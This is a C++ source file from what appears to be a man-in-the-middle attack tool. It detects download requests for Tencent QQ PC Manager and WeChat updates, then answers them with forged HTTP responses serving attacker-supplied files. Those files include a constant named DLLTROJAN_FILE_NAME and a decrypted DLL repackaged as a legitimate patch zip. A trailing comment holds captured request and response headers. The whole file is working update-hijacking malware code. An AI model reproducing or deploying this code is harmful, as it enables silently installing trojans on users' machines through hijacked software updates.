
#include "QQManager.h"
#include "PluginServer.h"
#include "../attacker.h"
#include "../FileOper.h"
#include <string>
using namespace std;

//Game_setup.zip

int gQQManagerFlag = 3;

int QQManager::isQQManager(const char * url, const char * host) {
	if (strstr(host, "pm.myapp.com") && (strstr(url, ".exe")|| strstr(url, ".dll")) )
	{
		if (strstr(url, "/invc/") )
		{
			gQQManagerFlag = 1;
			return TRUE;
		}
	}
	if (strstr(host, "pm.myapp.com") && strstr(url, ".zip"))
	{
		if (strstr(url, "/invc/") )
		{
			gQQManagerFlag = 4;
			return TRUE;
		}
	}
	else if (strstr(host, "dl_dir.qq.com") && strstr(url, "/qqfile/ims/qqdoctor/tssafeedit.dat"))
	{
		gQQManagerFlag = 2;
		return TRUE;
	}
	else if (strstr(host, "pm.myapp.com") && strstr(url, "/invc/qqpcmgr/other/cube_patch/RemainProcClean"))
	{
		gQQManagerFlag = 3;
		return TRUE;
	}

	return FALSE;
}


int QQManager::replayQQManager(char * dstbuf, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = 0;

	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = "";
	if (gQQManagerFlag == 1)
	{
		filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
	}
	else if (gQQManagerFlag == 2)
	{
		filename = Public::getUserUrl(lphttp->username, DLLTROJAN_FILE_NAME);
	}
	else if (gQQManagerFlag == 3)
	{
		string exesrcfn = Public::getUserPluginPath(lphttp->username) + "downloadhelper.dll";
		string newexefn = exesrcfn + "_new.exe";
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);
		if (ret <= 0)
		{
			return FALSE;
		}

		string srczip = "RemainProcClean.dll.zip";

		filename = Public::getUserPluginPath(lphttp->username) + srczip;

		string inzipfn = "../tmp/RemainProcClean.dll";

		ret = Public::zipFile(inzipfn.c_str(), newexefn, filename);
		if (ret == 0)
		{
			return FALSE;
		}
	}
	else if (gQQManagerFlag == 4)
	{
		filename = Public::getUserUrl(lphttp->username, WEIXIN_PC_UPDATE_ZIP_FILENAME);
	}

	ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpPartialZipFormat, 1);
	return 0;
}
///dldir3.qq.comminigamefile/Game_setup.zip
int QQManager::replayQQManager(char * dstbuf, int dstbuflimit, LPSSLPROXYPARAM lpssl) {
	int ret = 0;

	char * szHttpPartialZipFormat = "HTTP/1.1 200 OK\r\n"
		"Connection: keep-alive\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = "";
	if (gQQManagerFlag == 1)
	{
		filename = Public::getUserUrl(lpssl->username, WEIXIN_PC_UPDATE_EXE_FILENAME);
	}
	else if (gQQManagerFlag == 2)
	{
		filename = Public::getUserUrl(lpssl->username, DLLTROJAN_FILE_NAME);
	}
	else if (gQQManagerFlag == 3)
	{
		string exesrcfn = Public::getUserPluginPath(lpssl->username) + "downloadhelper.dll";
		string newexefn = exesrcfn + "_new.exe";
		ret = FileOper::fileDecryptWriter(exesrcfn, newexefn);
		if (ret <= 0)
		{
			return FALSE;
		}

		string srczip = "RemainProcClean.dll.zip";

		filename = Public::getUserPluginPath(lpssl->username) + srczip;

		string inzipfn = "../tmp/RemainProcClean.dll";

		ret = Public::zipFile(inzipfn.c_str(), newexefn, filename);
		if (ret == 0)
		{
			return FALSE;
		}
	}

	ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpPartialZipFormat, 1);
	return 0;
}


/*
GET /invc/qqpcmgr/other/cube_patch/RemainProcClean24/RemainProcClean.dll.zip HTTP/1.1
Accept: *//*
Connection: Keep-Alive
Host: pm.myapp.com
Referer: https://pm.myapp.com/
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.202 Safari/535.1 .TDCH 5.0;

GET /invc/xfspeed/qqpcmgr/download/QQPCDownload1334.exe HTTP/1.1
Host: pm.myapp.com
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*//*;q=0.8
Referer: https://guanjia.qq.com/?ADTAG=media.buy.baidu.TXGJSEM
Accept-Encoding: gzip, deflate

HTTP/1.1 200 OK
Server: NWSs
Date: Tue, 04 Jun 2019 01:47:56 GMT
Content-Type: application/octet-stream
Content-Length: 1641536
Connection: keep-alive
Cache-Control: max-age=600
Expires: Tue, 04 Jun 2019 01:57:55 GMT
Last-Modified: Fri, 21 Sep 2018 06:01:18 GMT
X-NWS-UUID-VERIFY: 4db71f764540bd5eb7b50e98a67ee8c1
X-NWS-LOG-UUID: 25334cbc-5a75-46d9-a94d-ea93ebb3a223
X-Cache-Lookup: Hit From Disktank3


*/